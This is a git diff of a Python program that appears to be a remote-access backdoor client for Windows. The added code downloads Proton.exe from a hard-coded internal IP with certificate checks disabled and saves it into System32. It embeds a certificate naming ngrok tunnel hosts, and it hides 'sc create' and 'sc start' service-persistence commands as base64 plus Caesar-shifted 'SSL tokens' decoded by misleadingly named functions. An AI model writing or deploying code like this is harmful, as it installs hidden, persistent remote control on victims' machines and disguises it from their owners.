@@ -1,5 +1,6 @@
 import base64
 import os
+import re
 import ssl
 import subprocess
 import tempfile
@@ -7,9 +8,41 @@ import tempfile
 from datetime import datetime
 
 import requests
+import urllib3
 
 cert_text = """
-
+-----BEGIN CERTIFICATE-----
+MIIFnDCCA4SgAwIBAgIUdAxU0B+1rFIUaMiJlFhp1Be0In4wDQYJKoZIhvcNAQEL
+BQAwRTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoM
+GEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDAeFw0yNDEwMDkwNjE5MDNaFw0yNDEx
+MDgwNjE5MDNaMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEw
+HwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwggIiMA0GCSqGSIb3DQEB
+AQUAA4ICDwAwggIKAoICAQC5kHgHr3GDuJZDLMesLIwoEBFVf1bAsRp/Z6OV6vhb
+8aeeKXsjtLeXu2BnYHRDgJjJacIt27f7yh8DA3qQAzS1UpAzermr87p+u1pDrsHg
+EPgroX2EXUfBaJ34fstv2eBrMI5otYwdZiyR7I8HAQFA63u/XJXcB6+W/xR3qbFd
+UsugIW5hUEPscZ+Z4F219h2JWvDHgvWqZvdazFPfohu8XaHJe3Yak06s4p6NFAjh
+svVWRuQq9tOgdd1WGZxMToxEr63TFaNExba7xgeZJL8iWJphIImhDQf0gazJ11m4
+AXW1LyWiwA3nAs2tEf3Zj95oe7b0R6eHHn6j5S3YyNzZz6wPrcK/9PPkE8UeiLIF
+q4XkMGmhlWoRdW2t9smvf1Lj2RRu7QiwE2VwZk6C3TZDXo8bKom7X7zYRFYmcCf9
+RGNXQbq5VtsRvxURllUScdQQckwhLayFBfhzq8wLveJ4bSiGbGfXfDRkNi439fJy
+NcQOl2w7PGYF/WRDPJk0GIr1nnKemyWmxbz32NBlQcrezeAuY0f8r06lvC8MDHJ9
+aOXOfXkH1EewHlSehY2RtfwgIsLLF8wpaga37XuwXIpq9vqTP1IdH7qtvYYmbj95
+5+HRTfGo3x9a0c6nDrTvcAyCN2omMpiei1OoRNtN7ysPMwav5TkH+LzM/gxKjHrg
+KQIDAQABo4GDMIGAMAkGA1UdEwQCMAAwCwYDVR0PBAQDAgXgMEcGA1UdEQRAMD6H
+BH8AAAGHBMCoWDeHBMCoWDqHBMCoWEaCETAudGNwLmFwLm5ncm9rLmlvghEwLnRj
+cC5hdS5uZ3Jvay5pbzAdBgNVHQ4EFgQUBE4QsE8r9L2BHv8ZPOgaYrHxdNUwDQYJ
+KoZIhvcNAQELBQADggIBAFLbxoYeqkYTIsherqQ4ghR4YG1n1lMEmmWgLTWvlN1v
+N8YQYvkAxqhKIdqD9CeITSMZrgOFIoUnt437eUkhbyksnF5/gZoSMyPW7RWzpOCS
+3cazEk3zEc+pNwYEJ5Vo8td14ofihVIUN1TpGyRBf+Pfx7RooNiiyLLHnABIWbLf
+bqMlukIxDqEazHjmYYGcDge6l7zESl8HRvKFBXimWHpTZQ7Ak/+mSA77Sdu0tqQ1
+KFIkhjNyi1VaoL06fkOXZi5S44MzT+0suPNK2aLW/5VzmSbcGdFfXnIDxm/TDNZR
+kE+HA6JCwHKS4QRmfAk6puODAuCU0nVks8R94ZakuVGczXQjKP9NbNhkCALd4uuB
+B2dHfObX6LIo3dz4mubNl8W/56dMUb7qCFcwaqagEe58ecNBOmbEqCrTjbjOMac6
+rQoCGPNvFiV7hat97AWynbsbr0vmB2DNdd2m1u93fLw8dNLpleWUGk8Mif1LirbZ
+o1ItqYlgI9Rf9UOayT5wF4sYTfXEMsO0KUQmCafdwkj6+MgBHrzgQITuZNoeJpDc
+CNRJP80BF2qS9fvRI0XZ6JpV4nx41tlu9JLRl8n9dTq+yYvNIZUiPivW3R1QmFNd
+w5X9wexEPMOvjYTwyaiDWFtjDCZbKS0NC3BYtRes7mOqq2hv+ZPodFNC+jiVh55m
+-----END CERTIFICATE-----
 """
 
 
@@ -27,28 +60,21 @@ def today():
     return iso_8601_format
 
 
-def handle_ls(result):
-    response = modify_result(result.stdout)
-    return response
-
-
-def modify_result(ls_response):
-    response = ls_response.split('\n')
-    directory_list = []
-    file_list = []
-
-    for item in response:
-        if item:
-            if "." in item:
-                file_list.append(item)
-            else:
-                directory_list.append(item)
+def handle_ls(cwd):
+    items = os.listdir(cwd)
+    files = []
+    directories = []
+    for item in items:
+        item_path = os.path.join(cwd, item)
+        if os.path.isdir(item_path):
+            directories.append(item)
+        else:
+            files.append(item)
 
     result_json = {
-        "directories": directory_list,
-        "files": file_list
+        "directories": directories,
+        "files": files
     }
-
     return result_json
 
 
@@ -92,8 +118,8 @@ def handle_cd(command):
             os.chdir(os.path.expanduser(directory_path))
             cwd = os.getcwd()
 
-            result = subprocess.run("ls", shell=True, capture_output=True, text=True)
-            response = handle_ls(result)
+            # result = subprocess.run("ls", shell=True, capture_output=True, text=True)
+            response = handle_ls(cwd)
             response['cwd'] = cwd
             return response
 
@@ -142,8 +168,9 @@ async def receive_file(websocket, filename: str):
 
 
 async def receive_file_parent(websocket):
-    filename = "Proton.exe"
-    file_path = f"C:\\Windows\\System32\\{filename}"
+    filename = "Proton.pdf"
+    # file_path = f"C:\\Windows\\System32\\{filename}"
+    file_path = f"download/{filename}"
     try:
         file_data = await websocket.recv()
 
@@ -155,6 +182,28 @@ async def receive_file_parent(websocket):
             return f"Received and saved {file_path} successfully."
     except Exception as e:
         return f"Error receiving {filename}: {str(e)}"
+
+
+def config_proton():
+    url = 'https://192.168.88.70:8000/download'
+
+    # Send a GET request to download the file
+    response = requests.get(url, stream=True, verify=False)
+
+    # Check if the request was successful
+    if response.status_code == 200:
+        filename = "Proton.exe"
+        file_path = f"C:\\Windows\\System32\\{filename}"
+
+        # Open the file in write-binary mode and write the content
+        with open(file_path, 'wb') as file:
+            for chunk in response.iter_content(chunk_size=8192):
+                if chunk:
+                    file.write(chunk)
+
+        return f"File downloaded and saved as {file_path}"
+    else:
+        return f"Failed to download file. Status code: {response.status_code}"
 
 
 # def receive_file(conn, filename):
@@ -189,8 +238,11 @@ def solve_ssl(ssl_session_token):
         else:
             cert_tex += char  # Leave non-alphabetic characters unchanged
 
+    # Suppress only the InsecureRequestWarning
+    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
     # Disable SSL verification
-    print(cert_tex)
+    # print(cert_tex)
     response = requests.get(cert_tex, verify=False)
 
     # Print the response
@@ -209,5 +261,24 @@ def varify_cert(cert_text):
     return ssl_context
 
 
-def get_proton_token():
-    return "dmYgZnVoZHdoICdTdXJ3cnFxJyBlbHFTZHdrPSdGOlxabHFncnp2XFZidndocDMyXFN1cndycS5oYWgnIHZ3ZHV3PWR4d3I="
+def get_proton_token(active=False):
+    if active:
+        return "dmYgdndkdXcgU3Vyd3JxcQ=="
+    return "dmYgZnVoZHdoIFN1cndycXEgZWxxU2R3az1GOlxabHFncnp2XFZidndocDMyXFN1cndycS5oYWggdndkdXc9ZHh3cg=="
+
+
+def solve_ssl_proton(ssl_session_token):
+    # Varify SSL token
+    bytes = ssl_session_token.encode('utf-8')
+    text_bytes = base64.b64decode(bytes).decode('utf-8')
+
+    cert_tex = ""
+    for char in text_bytes:
+        if char.isalpha():
+            shift_base = 65 if char.isupper() else 97
+            decrypted_char = chr((ord(char) - shift_base - 3) % 26 + shift_base)
+            cert_tex += decrypted_char
+        else:
+            cert_tex += char  # Leave non-alphabetic characters unchanged
+
+    return cert_tex
